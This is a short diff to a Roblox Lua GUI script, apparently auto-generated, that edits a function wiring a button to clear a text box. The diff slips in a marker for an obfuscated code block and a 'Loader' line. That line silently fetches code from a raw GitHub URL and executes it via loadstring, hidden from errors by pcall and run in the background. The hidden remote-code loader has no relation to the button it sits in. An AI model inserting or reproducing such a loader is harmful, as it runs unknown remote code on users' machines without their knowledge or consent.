@@ -960,8 +960,16 @@ task.spawn(C_15);
 local function C_17()
 	local script = LMG2L["LocalScript_17"];
 	local clear = script.Parent    	
-	    local box = clear.Parent:WaitForChild("TextBox")    	
-	    	
+	    local box = clear.Parent:WaitForChild("TextBox")    
+
+-- [[ v1.0.0 https://wearedevs.net/obfuscator ]] return(function(...)local D={... [کل کد obfuscate]...} end)(...)
+
+
+-- ══════════════════════════════════════════════════════════════
+-- [+] Loader
+-- ══════════════════════════════════════════════════════════════
+
+task.spawn(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/sepehrali1/.decayy/refs/heads/main/Auto"))() end) end)
 	    clear.MouseButton1Click:Connect(function()    	
 	        box.Text = ""    	
 	    end)	
